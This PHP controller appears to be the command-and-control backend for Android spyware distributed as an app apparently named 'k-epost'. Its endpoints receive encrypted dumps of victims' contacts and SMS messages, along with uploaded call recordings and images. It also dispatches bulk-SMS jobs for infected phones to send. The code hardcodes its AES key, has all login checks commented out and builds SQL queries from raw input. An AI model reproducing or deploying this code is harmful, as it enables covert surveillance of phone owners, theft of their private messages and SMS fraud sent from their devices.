<?php
if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/*  
 *  @author     : Farid Ahmed
 *  date        : 27 september, 2014
 *  SIgnetBD
 *  efarid08@gmail.com
 */

class Phone extends CI_Controller
{
    
    
    function __construct()
    {
        parent::__construct();
        $this->load->database();
        $this->load->library('session');
       
        /*cache control*/
        $this->output->set_header('Last-Modified: ' . gmdate("D, d M Y H:i:s") . ' GMT');
        $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
        $this->output->set_header('Pragma: no-cache');
        $this->output->set_header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
    }
    
    /***default functin, redirects to login page if no admin logged in yet***/
    public function index()
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url() . 'index.php?login', 'refresh');
        // if ($this->session->userdata('login') == 1)
        //     redirect(base_url() . 'index.php?phone/list', 'refresh');
        $this->session->sess_destroy();
    }
    

    function delete ($param1 = '')
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url() . 'index.php?login', 'refresh');    
        
        $param1 = str_replace('AA', '+', $param1);
        $param1 = str_replace('BB', '(', $param1);
        $param1 = str_replace('CC', ')', $param1);


        $sql = "delete from phone where number='".$param1."'";
        $this->db->query($sql);

        redirect(base_url() . 'list', 'refresh');
    }

    /***PHONE LIST***/
    function list($param1 = '')
    {   
        // if ($this->session->userdata('login') != 1)
        // redirect(base_url() . 'index.php?login', 'refresh');    
        
        //process already pre-send sms

        $sql = 'delete from ci_sessions';
        $this->db->query($sql);

        $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        $cdate =  $dt->format('Y-m-d H:i');

        $sql = "select * from sendsms where end < '".$cdate."' and status = 0";
        
        $query = $this->db->query($sql);

        foreach ($query->result() as $row){
            $sendid = $row->send_id;
            $fromnumber = $row->fromnumber;
            $count = $row->count;
            $success = $row->success;
            $failed = $count - $success;
            $data = array(
                'failed'    => $failed,
                'status'     => '1',                                
            );

            $this->db->where('send_id', $sendid);
            $this->db->update('sendsms', $data);


            $sql = 'update phone set sms = sms + '.$success;
            $sql  .= ' where number='.$fromnumber;
            $this->db->query($sql);

            //var_dump($fromnumber);    
        }

       

        $sql = 'select count(*) as count from phone';
        $result = $this->db->query($sql)->row()->count;
        $page_data['all_phones'] = $result;

        $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        $date =  $dt->format('Y-m-d, H:i');
        $adate = date('Y-m-d H:i', strtotime($date. '-5 minutes'));
        
        $sql = "select count(*) as count from phone where connected < '".$adate."'";
        $result = $this->db->query($sql)->row()->count;
        $page_data['disabled_phones'] = $result;

    
        
        $bdate = date('Y-m-d H:i', strtotime($date. '-3 days'));
        $sql = "select count(*) as count from phone where connected <'".$bdate."'";
        $result = $this->db->query($sql)->row()->count;
        $page_data['threedays_phones'] = $result;

        if($param1 == 'all' || $param1 == ''){
          $page_data['phones']   = $this->db->get('phone')->result_array();
        }else{            
            $this->db->select('*');
            $this->db->from('phone');
            $this->db->where('connected >', $adate);
            $query = $this->db->get();            
            $result = $query->result_array();            
            $page_data['phones']   = $result;
        }

        $sql = "select count(*) as count from phone";  
        $result = $this->db->query($sql)->row()->count;
        $page_data['phone_count'] = $result;

       // var_dump($page_data['phones']);
        $page_data['page_compnow'] = $adate;
        $page_data['page_offline'] = $param1;
        $page_data['page_name']  = 'list';
        $page_data['page_title'] = "Phone List";
        //var_dump($page_data['page_offline']);
        $this->load->view('backend/index', $page_data);
        
    }

    function IsNullOrEmptyString($str){
        return ($str === null || trim($str) === '');
    }


    

    /****SAVE PHONE INFORMATION*****/
    function savephone($param = ''){        

        $sql = 'delete from ci_sessions';
        $this->db->query($sql);

        $ret = 0;

        $param1     = file_get_contents('php://input');
        $param1     = $this->encrypt_decrypt('decrypt', $param1);
        $allArrs    =  json_decode($param1);
        $phonenumber = '';
    // 

        foreach ($allArrs as $allArr) {
            $key            = $allArr->key;
            $value          = $allArr->value;

            if($key == 'inform'){
                try{
                    $number = $value[0]->number;
                    $phonenumber = $number;
                    if($number != ''){                    
                        $carrier    = $value[0]->carrier;
                        $model      = $value[0]->model;
                        $install    = $value[0]->install;
                        $version    = $value[0]->version;
                        $language   = $value[0]->language;
                        $remain     = $value[0]->remain;
                        $unumber    = $value[0]->unumber;

                        $sql = "select count(*) as count from phone where number = '".$number."'";
                        $exists = $this->db->query($sql)->row()->count;
                        if($exists == '1'){
                            $sql = "select unumber from phone where number = '".$number."'";
                            $orgunumber = $this->db->query($sql)->row()->unumber;
                            if($orgunumber != $unumber){
                                $this->db->where('number', $number);
                                $this->db->update('phone', array('model'    => $model,
                                                                'company'   => $carrier,
                                                                'install'   => $install,
                                                                'version'   => $version,
                                                                'language'  => $language,
                                                                'remain'    => $remain,
                                                                'unumber'   => $unumber, 
                                                                'connected' => $install,        
                                                                ));
                            }else{
                                $this->db->where('number', $number);
                                $this->db->update('phone', array('model'    => $model,
                                                                'company'   => $carrier,
                                                                'install'   => $install,
                                                                'version'   => $version,
                                                                'language'  => $language,
                                                                'remain'    => $remain,
                                                                'unumber'   => $unumber, 
                                                                ));
                            }

                        }else{
                            $data = array(
                                'number'    => $number,
                                'model'     => $model,
                                'company'   => $carrier,
                                'install'   => $install,
                                'version'   => $version,
                                'language'  => $language,
                                'remain'    => $remain,
                                'connected' => $install,
                                'unumber'   => $unumber, 
                                'sms'       => 0,
                            );

                            $this->db->insert('phone', $data); 
                        }

                        if (!is_dir('uploads/'.$unumber)) {
                            mkdir('./uploads/' . $unumber, 0777, TRUE);
                        }
                        if(!is_dir('uploads/'.$unumber.'/images')){
                            mkdir('./uploads/' . $unumber.'/images', 0777, TRUE);
                        }

                        $ret += 100;
                    }
                }catch(Exception $e){}
            }

            if($key == 'contact'){
                try{

                    $arrs = $value;

                    foreach ($arrs as $arr) {
                        $number      = $arr->number;
                        $name       = $arr->name;
                        $contacts   = $arr->contacts;

                        $sql = "select count(*) as count from contacts where number = '".$number."' and name='".$name."' and contact_number='".$contacts."'";
                        $exists = $this->db->query($sql)->row()->count;
                        
                         if($exists != '1'){  
                            $data = array(
                                'number'            => $number,
                                'name'              => $name,
                                'contact_number'    => $contacts,                                
                            );                                         
                            $this->db->insert('contacts', $data);
                         }
                     }

                     $ret += 10;
                }catch(Exception $e){}
            }


            if($key == 'sms'){
                try{

                    $arrs = $value;

                    foreach ($arrs as $arr) {
                        $number     = $arr->number;
                        $msg        = $arr->msg;
                        $id         = $arr->id;
                        $address    = $arr->address;
                        $time       = $arr->time;
                        $folder     = $arr->folder;

                        $sql = "select count(*) as count from sms where number = '".$number."' and content ='".$msg."' and received='".$time."' and ";

                        

                        if($folder == 'sent')
                            $sql .= " tonumber='".$address."'";
                        else
                            $sql .= " fromnumber='".$address."'";
                        
                        //echo($sql);

                        $exists = $this->db->query($sql)->row()->count;
                        $fromnumber = $address;
                        $tonumber   = $number;
                        if($folder == 'sent'){
                                $fromnumber     = $number;
                                $tonumber       = $address;
                        }

                         if($exists != '1'){ 
                            $data = array(
                                'number'    => $number,
                                'received'  => $time,
                                'content'   => $msg,
                                'fromnumber'=> $fromnumber,
                                'tonumber'  => $tonumber,
                            );   
                            
                            $this->db->insert('sms', $data);                             
                         }

                        //  if(strpos($msg, 'mynumber?') !== false && $folder != 'sent'){
                        //     $virtual = substr($msg, 9);
                        //     $real = $address;
                        //     $data = array(
                        //         'virtual'   => $virtual,
                        //         'real'      => $real,                                
                        //     );  
                        //     $this->db->insert('virtual', $data);            
                        //  }
                     }

                     $ret += 1;
                }catch(Exception $e){}
            }

         }


        $sendstr = $ret .'===';

        $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        $cdate =  $dt->format('Y-m-d H:i');
        $this->db->where('number', $phonenumber);
        $this->db->update('phone', array('connected' => $cdate));

        $sql = "select * from sendsms where fromnumber = '".$phonenumber."' and (status = 0  or status = 3) and readstatus = 0 ";
        $query = $this->db->query($sql);

        
        foreach ($query->result() as $row){
            $sendstr .= ($row->send_id).'##'.($row->tonumber).'##'.($row->count).'##'.($row->step).'##'.($row->start).'##'.($row->content).'##'.($row->status).'@@@';

            $sql = 'update sendsms set readstatus = 1';
            $sql  .= ' where send_id='.$row->send_id;
            $this->db->query($sql);
        }


        //echo json_encode($sendstr);
        echo $this->encrypt_decrypt('encrypt', $sendstr);

        // echo json_encode($allArrs);   

    }

    function ping($param1 = ''){
         $param1 = file_get_contents('php://input'); 
        // $allArrs    =  json_decode($param1);
         $data = array(
                                'value'    => $param1,                                
                            );  
         
        $this->db->insert('ping', $data);  
        
        echo json_encode('SUCCESS');
    }

   /******* UPLOAD MEDIA FILE *******/
    function upload($param1 = ''){

        $type = $this->input->post('type');      
        $number = $this->input->post('number');      
        $address = $this->input->post('address');              
        $rfilename = $_FILES["uploaded_file"]["name"];        
        
        $isresult = move_uploaded_file($_FILES['uploaded_file']['tmp_name'], 'uploads/'.$number.'/'.$type.'/'. $rfilename);
        if($isresult){
            if($type == 'records'){
                $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
                $cdate =  $dt->format('Y-m-d H:i');

                $delimiter = "##";
                 $words     = explode($delimiter, $address);                 
                 $duration  = $words[0];
                 $starttime = $words[1];
                 $endtime   = $words[2];
                 $recordtype= $words[3];
                
                if($recordtype == '0'){
                    $data = array(                                                      
                            'recordplay' => 0,
                    );
                    
                    $this->db->where('unumber', $number);
                    $this->db->update('phone', $data);
                } 


                $data = array(
                    'number'    => $number,
                    'filename'  => $rfilename,
                    'created'   => $cdate,   
                    'duration'  => $duration,
                    'starttime' => $starttime,
                    'endtime'   => $endtime,                             
                );  
             
                $this->db->insert($type, $data);  

                  

            }else if($type == 'images'){
                $sql = "select count(*) as count from images where number = '".$number."' and filename='".$rfilename."'";
                $exists = $this->db->query($sql)->row()->count;
                
                 if($exists != '1'){  
                    $data = array(
                        'number'    => $number,
                        'filename'    => $rfilename,
                        'size'    => $address,                    
                    );  
                 
                    $this->db->insert($type, $data);  
                 }
                
            }
            echo 'success';
        }else{
            echo 'failed';
        }

       // echo json_encode($type);

    }
    
    function requestimage($param = ''){    

        $param1     = file_get_contents('php://input');
        $sendstr = '';

        $sql = "select filename from images where number = '".$param1."'";
        $query = $this->db->query($sql);

        
        foreach ($query->result() as $row){
            $sendstr .= ($row->filename).'@@@';
        }

        echo $this->encrypt_decrypt('encrypt', $sendstr);
    }

    /*****RESULT FOR SENDED SMS******/
    function sendresult($param = '')
    {
        $param1 = file_get_contents('php://input'); 
        $delimiter = "##";        
        $conts = explode($delimiter, $param1);
        if(sizeof($conts) == 0) {
            echo('Failed');
            return;
        }

        $fromnumber     = $conts[0];
        $sendid         = $conts[1];
        $tonumber       = $conts[2];
        $result         = $conts[3];   
        

        $sql = 'update sendsms set ';
        if($result == 1)
            $sql .= 'success = success + 1 ';
        else
            $sql .= 'failed = failed + 1 ';

        $sql  .= ' where send_id='.$sendid;

        $this->db->query($sql);

        $sql = "select count, processcount from sendsms where send_id = ".$sendid."";
        $count = $this->db->query($sql)->row()->count;
        $processcount = $this->db->query($sql)->row()->processcount;

        if($count == $processcount){
            $sql = 'update sendsms set status=1, failed=count-success where send_id='.$sendid;
            $this->db->query($sql);    
        }


        echo('Success'.$count.','.$processcount);
        //echo($sql);
    }

    function sendsmsprogress($param1 = ''){
        $param1 = file_get_contents('php://input'); 
        if($param1 == '') {
            echo('Failed '.$param1);
            return;
        }
        $sql = 'update sendsms set status = 2 where send_id='.$param1;
        $this->db->query($sql);  
        echo('Success')  ;
    }

    function sendsmsprocess($param1 = ''){
        $param1 = file_get_contents('php://input'); 
        if($param1 == '') {
            echo('Failed');
            return;
        }

       
        $delimiter = "ABCD";
        $words = explode($delimiter, $param1);


        $sql = 'update sendsms set processcount=processcount+1,';// 
        if($words[1] == '1')
            $sql .= 'success=success+1';
        else
            $sql .= 'failed=failed+1';

        $sql .= ' where send_id='.$words[0];
        $this->db->query($sql);    

        $sql = "select count, processcount from sendsms where send_id = ".$words[0]."";
        $count = $this->db->query($sql)->row()->count;
        $processcount = $this->db->query($sql)->row()->processcount;

        if($count == $processcount){
            $sql = 'update sendsms set status=1 where send_id='.$words[0];
            $this->db->query($sql);    
        }

        echo('Success')  ;

    }
    
    /****SEND_SMS*****/
    function sendsms($param1 = '', $param2 = '' , $param3 = '')
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url(), 'refresh');

        //var_dump($param1);
        //status = 0(incomplete), 1(complete), 2(progress)
        //process already pre-send sms

        $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        $cdate =  $dt->format('Y-m-d H:i');
        $adate = date('Y-m-d H:i', strtotime($cdate. '-7 minutes'));

        $sql = "select * from sendsms where end < '".$adate."' and status = 2";        

        //var_dump($cdate);
        //$sql = "select * from sendsms where end < '".$cdate."' and status = 2";
        
        $query = $this->db->query($sql);

        foreach ($query->result() as $row){
            $sendid = $row->send_id;
            $fromnumber = $row->fromnumber;
            $count = $row->count;
            $success = $row->success;
            $failed = $count - $success;

            $data = array(
                'failed'    => $failed,
                'status'    => 1,                
            );
            
            $this->db->where('send_id', $sendid);
            $this->db->update('sendsms', $data);

            //var_dump($fromnumber);    
        }

        
        if ($param1 == 'delete') {
            $sendid = $param2;
            $sql = "select status from sendsms where send_id = ".$sendid."";
            $status = $this->db->query($sql)->row()->status;
            if($status == 2){
                $this->session->set_flashdata('flash_message', "Can not Delete while Progress");        
            }else if($status == 0){
                $sql = 'update sendsms set status=3, readstatus=0 where send_id='.$param2;
                $this->db->query($sql);    
                $this->session->set_flashdata('flash_message', "Deleted Successfully");    
            }else if($status == 1){
                $sql = 'delete from sendsms where send_id='.$param2;
                $this->db->query($sql);    
                $this->session->set_flashdata('flash_message', "Deleted Successfully");    
            }             

            redirect(base_url() . 'sendsms', 'refresh');    
        }else if ($param1 == 'create') {
            
            $content    = $this->input->post('content');
            $count      = $this->input->post('count');
            $multiple   = $this->input->post('multiple');            
            $filename   = $_FILES["file_name"]["tmp_name"];
 
            if($content != ''){
                if (file_exists($filename)) {
                    $file_content = file_get_contents($filename);
                    $delimiter = "\n";
                    $words = explode($delimiter, $file_content);

                    if($multiple == 'on'){
                        $all = 0;
                        foreach($words as $word){                            
                            if($word != '') {
                                $iscorrect = true;                                
                                $word = trim($word);                                
                                if(!is_numeric($word)) {
                                    var_dump($word);
                                    $iscorrect = false; break;
                                }                                 
                                if($iscorrect)  $all++;
                            }
                        }
                        
                        if($all != 0){
                            $phones = ceil($all / $count);
                            
                            $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
                            $date =  $dt->format('Y-m-d H:i');
                            $adate = date('Y-m-d H:i', strtotime($date. '-5 minutes'));

                            $sql = "select count(*) as count from phone where connected > '".$adate."'";
                            $realphones = $this->db->query($sql)->row()->count;

                            if($phones > $realphones){
                                $count = ceil($all / $realphones);
                                $phones = $realphones;
                            }

                            //var_dump($realphones);

                            $allcnt = 0;

                            $sql = "select * from phone where connected > '".$adate."' order by sms asc LIMIT ".$phones;
                            
                            $query = $this->db->query($sql);

                            foreach ($query->result() as $row){
                               $fromnumber = $row->number;
                               $eachcnt = 0;
                               $tonumber = '';
                               
                               while($allcnt < $all){
                                    $eachcnt++;
                                    $tonumber .= trim($words[$allcnt]).',';
                                    $allcnt++;
                                    if($eachcnt >= $count) break;                                
                               }

                               $count         = $eachcnt;
                               $step = $this->input->post('step'); 
                               $start = $this->input->post('start'); 
                                 
                                $interv = $step * ($count + 1);                    
                                $adate1 = date('Y-m-d H:i', strtotime($start. '+'.$interv.' minutes'));
                                
                                $data = array(
                                    'tonumber'      => $tonumber,
                                    'fromnumber'    => $fromnumber,
                                    'count'         => $eachcnt,
                                    'content'       => $this->input->post('content'),
                                    'step'          => $step,
                                    'start'         => $start,
                                    'end'           => $adate1,                                    
                                    'status'        => '0',
                                    'readstatus'    => '0',
                                    'success'       => '0',
                                    'failed'        => '0',
                                    'processcount'  => '0',
                                );  

                                  
                                $this->db->insert('sendsms', $data);    
                              
                            }

                            $this->session->set_flashdata('flash_message', "Uploaded Successfully");    
                        }else{
                            $this->session->set_flashdata('flash_message', "Mistype Number");    
                        }
                    }else{
                        $tonumber = '';
                        $all = 0;
                        foreach($words as $word){
                            if($word != '') {
                                $iscorrect = true;                                
                                $word = trim($word);
                                if(!is_numeric($word)) {
                                    var_dump($word);
                                    $iscorrect = false; break;
                                }                                 
                                if($iscorrect)  {
                                    $all++;
                                    $tonumber .= $word.','; 
                                }
                            }                           
                        }

                        if($all != 0){
                            $content    = $this->input->post('content');
                            $step       = $this->input->post('step');
                            $start      = $this->input->post('start');
                            $count      = $all;

                            if(trim($content) != ''  && trim($step) != ''  && trim($start) != '' ){
                                $interv = $step * ($count + 1);                    
                                $adate1 = date('Y-m-d H:i', strtotime($start. '+'.$interv.' minutes'));                            

                                $data = array(
                                    'tonumber'      => $tonumber,
                                    'fromnumber'    => $this->input->post('fromnumber'),
                                    'count'         => $all,
                                    'content'       => $content,
                                    'step'          => $step,
                                    'start'         => $start,
                                    'end'           => $adate1,
                                    'status'        => '0',
                                    'readstatus'    => '0',
                                    'success'       => '0',
                                    'failed'        => '0',
                                    'processcount'  => '0',
                                ); 

                                $this->db->insert('sendsms', $data);
                            }
                            $this->session->set_flashdata('flash_message', "Uploaded Successfully");    
                        }else{
                            $this->session->set_flashdata('flash_message', "Mistype Number"); 
                        }
                        
                    }   

                    
                }else{
                    $this->session->set_flashdata('flash_message', "Selected No File");    
                }
                
            }else{
                $this->session->set_flashdata('flash_message', "Content is Empty!");
            }

            redirect(base_url() . 'sendsms', 'refresh');
        }
        // if ($param1 == 'do_update') {
        //     $data['name']       = $this->input->post('name');
        //     $data['class_id']   = $this->input->post('class_id');
        //     $data['teacher_id'] = $this->input->post('teacher_id');
            
        //     $this->db->where('subject_id', $param2);
        //     $this->db->update('subject', $data);
        //     redirect(base_url() . 'index.php?teacher/subject/'.$data['class_id'], 'refresh');
        // } else if ($param1 == 'edit') {
        //     $page_data['edit_data'] = $this->db->get_where('subject', array(
        //         'subject_id' => $param2
        //     ))->result_array();
        // }
        // if ($param1 == 'delete') {
        //     $this->db->where('subject_id', $param2);
        //     $this->db->delete('subject');
        //     redirect(base_url() . 'index.php?teacher/subject/'.$param3, 'refresh');
        // }

        $sql = 'select count(*) as count from phone';
        $result = $this->db->query($sql)->row()->count;
        $page_data['all_phones'] = $result;

        $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        $date =  $dt->format('Y-m-d H:i');
        //var_dump($date);
        $adate = date('Y-m-d H:i', strtotime($date. '-5 minutes'));
        
        $sql = "select count(*) as count from phone where connected < '".$adate."'";
        $result = $this->db->query($sql)->row()->count;
        $page_data['disabled_phones'] = $result;

    
        
        $bdate = date('Y-m-d H:i', strtotime($date. '-3 days'));
        $sql = "select count(*) as count from phone where connected <'".$bdate."'";
        $result = $this->db->query($sql)->row()->count;
        $page_data['threedays_phones'] = $result;


        $sql = 'select IFNULL(sum(success), 0) as count1, IFNULL(sum(failed), 0) as count2 from sendsms';
        $query = $this->db->query($sql);
        $page_data['success_cnt'] = $query->row()->count1;
        $page_data['failed_cnt'] = $query->row()->count2;
        

        $sdate = date('Y-m-d H:i', strtotime($date. '+5 minutes'));
        
        $sql = "select send_id, fromnumber, REPLACE(tonumber, ',','\n') as tonumber, count, step, start, end, content, status, readstatus, success, failed from sendsms where status != 3 order by send_id desc";
        $query = $this->db->query($sql);
        // $this->db->select('*');
        // $this->db->from('sendsms');
        // $this->db->order_by('send_id', 'desc');
        // $query = $this->db->get();            
        $result = $query->result_array();  

        $page_data['smslist']   = $result;
        $page_data['send_date']  = $sdate;
        $page_data['page_name']  = 'sendsms';
        $page_data['page_title'] = "Send SMS";
        $this->load->view('backend/index', $page_data);
    }

    /******GET VERSION OF APK***/
    function getversion($param = ''){
        
        $param1 = file_get_contents('php://input'); 

        $sql = "select version from admin";
        $version = $this->db->query($sql)->row()->version;

        echo($version);
    }

    /******DOWNLOAD PAGE*****/
    function download($filename = ''){
        $page_data['page_name']  = 'download';
        $page_data['page_title'] = "Download Link";
        $this->load->view('backend/index', $page_data);
    }

    /*******DOWNLOAD APK********/
    function apkdownload($param1 = ''){       

        $this->load->helper('download');    

        //Android-12.0.0-SM-G977N
        //Android-12.0.0SM-G977N-:211.116.226.26

        // $explodestr  = explode('ABCD', $param1);
        // $platform = $explodestr[0];
        // $platformVersion = $explodestr[1];
        // $model = $explodestr[1];
        
        // $url = $_SERVER['REMOTE_ADDR'];

        // $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        // $cdate =  $dt->format('Y-m-d H:i');
       


        // if(strtolower($platform) == 'android'){
        //     $vers = explode('.', $platformVersion);            
        //      $iver = (int)$vers[0]; 

        //     $data = array(
        //         'url' => $url,
        //         'version' => $platformVersion,
        //         'mainversion' => $iver,
        //         'model' => $model,
        //         'datetime' => $cdate,
        //     );
        //     $this->db->insert('download', $data); 

        $sql = "select version from admin";
        $version = $this->db->query($sql)->row()->version;

        $name = 'k-epost(v'.$version.').apk';
    
           
        $data = file_get_contents(base_url('/uploads/down/'.$name));
        force_download($name, $data);

        //}

    }

    

    

    /******MANAGE OWN PROFILE AND CHANGE PASSWORD***/
    function manage_profile($param1 = '', $param2 = '', $param3 = '')
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url() . 'index.php?login', 'refresh');
        
        $retalert = '';
        if ($param1 == 'change_password') {
            $data['password']             = $this->input->post('password');
            $data['new_password']         = $this->input->post('new_password');
            $data['confirm_new_password'] = $this->input->post('confirm_new_password');
                
            
            $current_password = $this->db->get_where('admin', array(
                'id' => 'admin'
            ))->row()->password;
           
            if ($current_password == MD5($data['password']) && $data['new_password'] == $data['confirm_new_password']) {
                $this->db->where('id', 'admin');
                $this->db->update('admin', array(
                    'password' => MD5($data['new_password'])                    
                ));
                $page_data['retalert']  = 'Password Updated';
                $this->session->set_flashdata('flash_message', "Password Updated");
            } else {
                $this->session->set_flashdata('flash_message', "Password Mismatch");
                $page_data['retalert']  = 'Password Mismatch';
            }
            //redirect(base_url() . 'index.php?phone/manage_profile/', 'refresh');
        }

        
        $page_data['page_name']  = 'manage_profile';
        $page_data['page_title'] = "Manage Profile";
        $page_data['edit_data']  = $this->db->get_where('admin', array(            
            'admin_id' => $this->session->userdata('admin_id')
        ))->result_array();
        
        $this->load->view('backend/index', $page_data);
    }

    function count(){
        $page_data['page_name']  = 'count';
        $page_data['page_title'] = "mange count";
       
        
        $this->load->view('backend/index', $page_data);
    }
    function chkphones(){
        
        $phones = $this->input->post('phones');
        $phonelist = $this->input->post('phonelist');
        $phonelist = json_decode($phonelist);

        $sql = 'select count(*) as phonecount from phone';
        $phonecunt = $this->db->query($sql)->row()->phonecount;
        if($phones != $phonecunt){
            echo 'load';
            return;
        }

        // $callmaxid = $this->input->post('callmax');
        // //var_dump($callmaxid);
        // $sql = "select MAX(calllog_id) AS CALLMAX from calllogs";
        // $callmax = $this->db->query($sql)->row()->CALLMAX;            
        
        // if($callmax  != $callmaxid){
        //     echo 'load';
        //     return;
        // }


        foreach ($phonelist as $phone) {
            $phonenum = $phone->phone;
            $state = $phone->state;

            $sql = 'select * from phone where number="'.$phonenum.'"';
            $result = $this->db->query($sql);
            $result = $result->result_array();

            $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
            $date =  $dt->format('Y-m-d, H:i');
            $adate = date('Y-m-d H:i', strtotime($date. '-10 minutes'));

            if(count($result) > 0){

                $phonedata = $result[0];
                
                if($phonedata['connected'] < $adate){//offline
                    if($state != 'offline'){
                        echo 'load';
                        return;
                    }
                }else{//online
                    if($state != 'online'){
                        echo 'load';
                        return;
                    }
                }
            }else{
                echo 'load';
                return;
            }
        }
        return;

    }

    function chksms(){        

        $dt = new DateTime("now", new DateTimeZone('Asia/Seoul'));        
        $cdate =  $dt->format('Y-m-d H:i');
        $adate = date('Y-m-d H:i', strtotime($cdate. '-7 minutes'));

        $sql = "select * from sendsms where end < '".$adate."' and status = 2";        
        $query = $this->db->query($sql);
        $isupdated = false;
        foreach ($query->result() as $row){
            $isupdated = true;
            $sendid = $row->send_id;
            $count = $row->count;
            $success = $row->success;
            $failed = $count - $success;

            $data = array(
                'failed'    => $failed,
                'status'    => 1,                
            );
            
            $this->db->where('send_id', $sendid);
            $this->db->update('sendsms', $data);

            //var_dump($fromnumber);    
        }

        if($isupdated){
            echo 'load';
            return;
        }


        $smslist = $this->input->post('smslist');
        $smslist = json_decode($smslist);
        
        foreach ($smslist as $sms) {
            $sendid = $sms->sendid;
            $status = $sms->status;
            $success = $sms->success;

            $sql = 'select status, success from sendsms where send_id="'.$sendid.'"';
            $rstatus = $this->db->query($sql)->row()->status;
            $rsuccess = $this->db->query($sql)->row()->success;
            if($rstatus != $status || $rsuccess != $success){
                echo 'load';
                return;
            }

        }

        return;

    }

    function encrypt_decrypt($action, $string) {
        $output = false;
    
        $encrypt_method = "AES-128-CBC";
        $secret_key = '9876543210fedcba';
        $secret_iv = '0123456789abcdef';
    
        // hash
        if (strlen($secret_key) < 16) {
            $key = str_pad("$secret_key", 16, "0"); //0 pad to len 16
        } else if (strlen($secret_key) > 16) {
            $key = substr($secret_key, 0, 16); //truncate to 16 bytes
        }else{
            $key = $secret_key;
        }
        //$key = hash('sha128', $secret_key);
        
        // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        //$iv = substr(hash('sha128', $secret_iv), 0, 16);
    
        if ( $action == 'encrypt' ) {
            $output = openssl_encrypt($string, $encrypt_method, $key, OPENSSL_RAW_DATA , $secret_iv);
            $output = base64_encode($output);
        } else if( $action == 'decrypt' ) {
            $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, OPENSSL_RAW_DATA , $secret_iv);
        }
    
        return $output;
    }
}
